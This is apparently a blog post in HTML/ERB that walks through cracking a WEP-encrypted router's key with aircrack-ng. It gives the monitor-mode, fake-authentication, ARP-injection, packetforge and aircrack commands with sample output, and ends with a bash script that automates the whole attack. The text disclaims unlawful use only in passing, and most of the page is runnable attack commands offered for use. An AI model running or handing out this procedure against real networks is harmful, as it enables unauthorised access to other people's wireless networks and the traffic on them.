<div>
  God of course not... As long as you use Linux! and maybe Mac...<br />
  <br />
  Now I'll show you why. Terminology used:
  <ul>
    <li><code>interface</code> - your wireless card's interface (wlan0, ath0, etc.)</li>
    <li><code>channel</code> - the channel of the broadcasting router</li>
    <li><code>SSID</code> - the SSID of the broadcasting router (name)</li>
    <li><code>MAC</code> - the MAC address of the broadcasting router (6 pairs of hexadecimal digits)</li>
  </ul>
  Here's how to crack with the <a href="http://download.aircrack-ng.org/">aircrack-ng</a> suite. Obviously, however, I
  do not condone any unlawful activity...
</div>
<strong>Prepare</strong> <%= link_to_function '[show/hide]', "$('prepare').toggle()" %>
<div id="prepare" style="display:none;">
  <ul>
    <li>Get the MAC address of the WEP encrypted router. This can be done with any network scanner. I like kismet.</li>
    <li>
      Get the channel the router is broadcasting on. Again, any good network scanner can do this. Again, I like kismet
    </li>
    <li>Get the broadcase SSID of router. Kismet. Again.</li>
  </ul>
</div>

<br />
<strong>Setup</strong> <%= link_to_function '[show/hide]', "$('setup').toggle()" %>
<div id="setup" style="display:none;">
  Kill any network managing things, kill your DHCP client, disassociate from things, the works. Also, it'd be a good
  idea to remove your wireless card's module from the kernel and put it back in to give it a complete reset, although
  this isn't necessary
</div>

<br />
<strong>Monitor Mode</strong> <%= link_to_function '[show/hide]', "$('monitor').toggle()" %>
<div id="monitor" style="display:none;">
  Pretty straightforward...
  <pre>
    airmon-ng start <em>interface</em> <em>channel</em>
  </pre>
</div>

<br />
<strong>WPA Supplicant hack</strong> <%= link_to_function '[show/hide]', "$('wpa').toggle()" %>
<div id="wpa" style="display:none;">
  Yes, for WEP networks too. At least my card requires I do this. First create a file (name it whatever you want) and
  in it make sure it looks like this:
  <pre>
    ctrl_interface=/var/run/wpa_supplicant

    network={
            ssid="<em>SSID</em>"
            key_mgmt=NONE
            wep_key0=EF156FB5354BD60A13E2E3C65D
    }
  </pre>
  Of course replace the SSID with yours. The wep_key0 can be any random thing really. After this, use wpa_supplicant
  to authenticate.
  <pre>
    wpa_supplicant -c /path/to/wpa/config/file -i <em>interface</em> -Dwext -dd
  </pre>
  You may need to change the <code>wext</code> to something else, or you could just drop the option. Anyway, when you
  get a message saying you've associated or connected, you can move on. It might look like this:
  <pre>
    CTRL-EVENT-CONNECTED - Connection to 00:11:22:33:44:55 completed (auth) [id=0 id_str=]
  </pre>
</div>

<br />
<strong>Capture Packets</strong> <%= link_to_function '[show/hide]', "$('capture').toggle()" %>
<div id="capture" style="display:none;">
  Now you need to capture some packets from the router. Do so with the following command:
  <pre>
    airodump-ng -c <em>channel</em> --bssid <em>MAC</em> -w output mon0
  </pre>
  The <code>mon0</code> <em>must</em> be <code>mon0</code>. This should work in all cases...
</div>

<br />
<strong>Fake Authenticate</strong> <%= link_to_function '[show/hide]', "$('fake').toggle()" %>
<div id="fake" style="display:none;">
  Now you need fake authenticate with the router. Do so with the following command:
  <pre>
    aireplay-ng -1 0 -a <em>MAC</em> mon0
  </pre>
  The <code>mon0</code> <em>must</em> be <code>mon0</code>. You gonna get a lot of output that's the same for awhile.
  When you see something like this, however:
  <pre>
    00:36:45  Sending Authentication Request (Open System) [ACK]
    00:36:45  Authentication successful
    00:36:45  Sending Association Request [ACK]
    00:36:45  Association successful :-) (AID: 1)
  </pre>
  You win. And you can move on. Sometimes this takes awhile, just let it run for a bit. This is a very tempermental
  step, so just be patient. If it fails, restart and it may work.
</div>

<br />
<strong>Injection</strong> <%= link_to_function '[show/hide]', "$('inject').toggle()" %>
<div id="inject" style="display:none;">
  Now inject some packets to the router, so we can get lots of stuff to crack the WEP key:
  <pre>
    aireplay-ng -3 -b <em>MAC</em> mon0
  </pre>
  <p>
    If you start seeing lots of lines of text, and the ARP requests and ACKS go up really fast, you're in business,
    you're capturing, you can now crack. If it stays at 0, however, or lines don't print out really fast, like it will
    on an empty network, you need to do some fancy stuff to inject your own packet into the network.
  </p>
  <strong>Inject A Packet</strong> <%= link_to_function '[show/hide]', "$('injectpacket').toggle()" %>
  <div id="injectpacket" style="display:none;">
    First, capture a packet with this command
    <pre>
      aireplay-ng -5 -b <em>MAC</em> mon0
    </pre>
    Or instead of -5 you can try -4, whatever you prefer. Once a packet is captured, use it and let the command do some
    other stuff and wait for it to succeed. Type 'y' to continue in the command. When done, it will look like this:
    <pre>
      00:41:48  Got RELAYED packet!!
      Saving keystream in fragment-0322-004148.xor
      Now you can build a packet with packetforge-ng out of that 1500 bytes keystream
    </pre>
    Now you need to inject the captured packet. First create a packet out of the captured material:
    <pre>
      packetforge-ng -0 -a <em>MAC</em>
                        -h <em>YOURMAC</em>
                        -k 255.255.255.255
                        -l 255.255.255.255
                        -y <em>CAPTURE</em>
                        -w arp-request
    </pre>
    Where <code>YOURMAC</code> is your computer's MAC address and <code>CAPTURE</code> is the <code>.xor</code> file
    which was previously captured. This command will create a <code>arp-request</code> file which is now ripe for
    injection.
    <br />
    <br />
    Inject the packet with this command:
    <pre>
      aireplay-ng -2 -r arp-request mon0
    </pre>
    <code>arp-request</code> is just the name of the generated packet above. Type 'y' to inject and watch the fireworks
    go off.<br /><br />
    You should now see your capture count
    on one of your terminals skyrocket. The lines should start printing, ARP requests going up, ACKs going up, etc.
    Time to crack.
  </div>
</div>

<br />
<strong>Cracking the key</strong> <%= link_to_function '[show/hide]', "$('crack').toggle()" %>
<div id="crack" style="display:none;">
  Well first off, congrats on getting this far. Second, time to do stuff. To crack, it's fairly simple, just execute
  this command:
  <pre>
    aircrack-ng -z -b <em>MAC</em> output-*.cap
  </pre>
  Must be executed in whatever directory you were capturing in... Anyway, if you have enough packets, it'll look
  like this and you'll have cracked it:
  <pre>
           Aircrack-ng 1.0 rc2


[00:00:00] Tested 781 keys (got 131130 IVs)

KB    depth   byte(vote)
 0    0/  1   BF(197632) 9E(145152) C4(145152) B3(144384) 22(143104)
 1   12/  1   AF(141568) C4(141056) DA(141056) 77(140288) D0(140288)
 2    0/  2   43(183040) EB(146176) 05(145152) 11(144896) B1(144640)
 3    9/  3   D7(141056) BE(140544) 65(139776) A0(139776) BD(139776)
 4    2/ 17   86(145920) 5B(144384) 7C(144384) 68(144128) F7(143616)

KEY FOUND! [ *********************************** :) ]
Decrypted correctly: 100%
  </pre>
  If it says it needs more packets, well get it some more packets!
</div>


<br />
<strong>Notes</strong> <%= link_to_function '[show/hide]', "$('notes').toggle()" %>
<div id="notes" style="display:none;">
  This is by no means comprehensive. Take a look at aircrack's
  <a href="http://www.aircrack-ng.org/doku.php?id=simple_wep_crack">wiki</a> for more comprehensive information. What
  I've got here is to be considered just a summary.<br/>
  <br/>
  If you're too lazy like I am to type all this stuff into a terminal, I've written a script to do it all for me. It
  just assumes that your terminal command is <code>terminal</code>. It takes 3 arguments, the channel, then the MAC,
  then the SSID, in that order. No gurantees it'll work for you, but it's a nice summary of the summary and if you're
  the least bit competent in scripting you'll get the main gist<br/>
  <%= link_to_function '[show/hide]', "$('script').toggle()" %>
  <pre id="script" style="display:none;">
    _process(){
      export $1="$2"
      if [ $"$1" == "" ]; then
        echo -n Specify $1:
        read $1
      fi
      eval echo \$"$1" | grep "$4" &amp;&gt; /dev/null
      if [ $? -gt 0 ]; then
        echo Need a valid $1
        exit 1
      fi
    }
    _process ch $1 "[0-9]"
    _process mac $2 "..:..:..:..:..:.."
    _process ssid "$3" ".*"

    dir=~/code/net
    mkdir -p $dir/caps

    echo -n Press enter to start...
    read

    echo Setting up environment...
    # insert killing stuff here
    sudo dhcpcd -x wlan0
    sudo killall wpa_supplicant
    sudo airmon-ng stop wlan0
    sudo airmon-ng stop mon0

    _execute(){
      echo -n $1
      read
      echo $2
      terminal --disable-server -H -x $2 &amp;
    }

    _execute "Press enter to put in monitor mode..." "sudo airmon-ng start wlan0 $ch"

    sed -i -r "s|(ssid=)\".+\"|\1\"$ssid\"|" $dir/wpa
    _execute "Press enter to associate..." \
             "sudo wpa_supplicant -c $dir/wpa -i wlan0 -Dwext -dd"

    cd $dir/caps
    sudo rm *
    _execute "Press enter to capture..." \
             "sudo airodump-ng -c $ch --bssid $mac -w output mon0"

    _execute "Press enter to fake authenticate..." "sudo aireplay-ng -1 0 -a $mac mon0"

    _execute "Press enter to inject packets..." "sudo aireplay-ng -3 -b $mac mon0"

    echo -n "Do we need to generate a packet? [y/N]:"
    read answer
    if [ "$answer" == "y" ]; then
      _execute "Press enter to capture a packet" "sudo aireplay-ng -5 -b $mac mon0"
      echo -n "Do we need to try other attack? [y/N]:"
      read ans
      if [ "$answer" == "y" ]; then
        _execute "Press enter to capture another packet..." \
                  "sudo aireplay-ng -4 -b $mac mon0"
      fi
      _execute "Press enter when a packet has been captured..." \
               "packetforge-ng -0 -a $mac \
                               -h &lt;YOURMAC&gt; \
                               -k 255.255.255.255 \
                               -l 255.255.255.255 \
                               -y fragment-*.xor \
                               -w arp-request"
      _execute "Press enter to inject packet" "sudo aireplay-ng -2 -r arp-request mon0"
    fi

    cd $dirs/caps
    _execute "Press enter to crack WEP..." "aircrack-ng -z -b $mac output*.cap"

    echo -n "Press enter to finish and close all terminals"
    read

    kill `ps -ef | grep "[t]erminal --disable-server" | awk '{print $2}'`
  </pre>
</div>
